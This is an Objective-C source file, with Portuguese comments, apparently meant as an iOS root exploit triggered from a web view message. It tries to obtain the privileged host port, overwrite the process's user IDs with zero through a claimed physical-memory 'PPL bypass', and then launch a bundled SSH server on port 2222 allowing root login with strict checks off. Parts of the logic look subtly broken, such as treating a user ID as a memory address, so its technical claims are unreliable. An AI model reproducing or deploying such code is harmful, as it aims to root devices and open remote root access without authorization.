#import <Foundation/Foundation.h>
#import <WebKit/WebKit.h>
#import <dlfcn.h>
#include <spawn.h>
#include <sys/sysctl.h>
#include <mach/mach.h>
#include <sys/wait.h>

// Definição da flag de bypass de sandbox para o spawn
#define POSIX_SPAWN_FOR_SANDBOX 0x4000

@interface KernelBridge : NSObject <WKScriptMessageHandler>
@property (nonatomic, strong) WKWebView *webView;
@end

@implementation KernelBridge

- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
    if ([message.body[@"op"] isEqualToString:@"scan_uid"]) {
        [self executePhysicalPPLBypass];
    }
}

- (void)log:(NSString *)text {
    dispatch_async(dispatch_get_main_queue(), ^{
        NSString *js = [NSString stringWithFormat:@"log('%@')", text];
        [self.webView evaluateJavaScript:js completionHandler:nil];
    });
}

- (void)executePhysicalPPLBypass {
    [self log:@"⚡ Resolvendo host_get_priv_port dinamicamente..."];

    // 1. RESOLVER FUNÇÃO PRIVADA (Bypass Linker Error)
    typedef kern_return_t (*host_get_priv_port_ptr)(mach_port_t, mach_port_t *);
    host_get_priv_port_ptr host_get_priv_port = (host_get_priv_port_ptr)dlsym(RTLD_DEFAULT, "host_get_priv_port");

    if (!host_get_priv_port) {
        [self log:@"❌ Erro: Função host_get_priv_port não encontrada no iOS."];
        return;
    }

    mach_port_t host_priv = MACH_PORT_NULL;
    kern_return_t kr_host = host_get_priv_port(mach_host_self(), &host_priv);

    if (kr_host != KERN_SUCCESS || !MACH_PORT_VALID(host_priv)) {
        [self log:[NSString stringWithFormat:@"❌ Erro host_priv: %d (Acesso Negado)", kr_host]];
        return;
    }

    // 2. LOCALIZAR PROCESSO E CREDENCIAIS
    int mib[] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};
    struct kinfo_proc kp;
    size_t len = sizeof(kp);
    if (sysctl(mib, 4, &kp, &len, NULL, 0) != 0) return;

    // Endereço virtual do UID (cr_uid)
    uint64_t ucred_vaddr = (uint64_t)kp.kp_eproc.e_ucred.cr_uid;
    uint32_t root_val = 0;

    // 3. MAPEAMENTO FÍSICO (Bypass PPL)
    vm_address_t page_addr = 0;
    // Mapeia a memória física diretamente usando a porta privilegiada
    kern_return_t kr = vm_map(mach_task_self(), &page_addr, 4096, 0, VM_FLAGS_ANYWHERE, host_priv, ucred_vaddr & ~0xFFF, FALSE, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);

    if (kr == KERN_SUCCESS) {
        uint32_t *phys_ptr = (uint32_t *)(page_addr + (ucred_vaddr & 0xFFF));
        *phys_ptr = root_val;     // cr_uid = 0
        *(phys_ptr + 1) = root_val; // cr_ruid = 0
        
        [self log:@"💎 Sucesso: Memória Física alterada!"];
        vm_deallocate(mach_task_self(), page_addr, 4096);
    }

    // 4. VERIFICAÇÃO E LANÇAMENTO DO SSHD
    if (getuid() == 0) {
        [self log:@"👑 <b>ROOT SUCESSO!</b> Invocando SSHD..."];
        [self launchSshd];
    } else {
        [self log:[NSString stringWithFormat:@"❌ Falha: UID ainda é mobile (Error: %d)", kr]];
    }
}

- (void)launchSshd {
    pid_t pid;
    NSString *sshdPath = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
    
    if (!sshdPath) {
        [self log:@"❌ Erro: Binário sshd não encontrado no Bundle."];
        return;
    }

    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    short flags = POSIX_SPAWN_SETPGROUP | POSIX_SPAWN_FOR_SANDBOX;
    posix_spawnattr_setflags(&attr, flags);

    char *const args[] = {
        (char *)[sshdPath UTF8String],
        "-p", "2222",
        "-D",
        "-o", "PermitRootLogin=yes",
        "-o", "StrictModes=no",
        NULL
    };

    extern char **environ;
    int status = posix_spawn(&pid, [sshdPath UTF8String], NULL, &attr, args, environ);

    if (status == 0) {
        [self log:[NSString stringWithFormat:@"✅ SSHD ONLINE! PID: %d porta 2222", pid]];
    } else {
        [self log:[NSString stringWithFormat:@"❌ Erro Spawn: %d (%s)", status, strerror(status)]];
    }
    
    posix_spawnattr_destroy(&attr);
}

@end
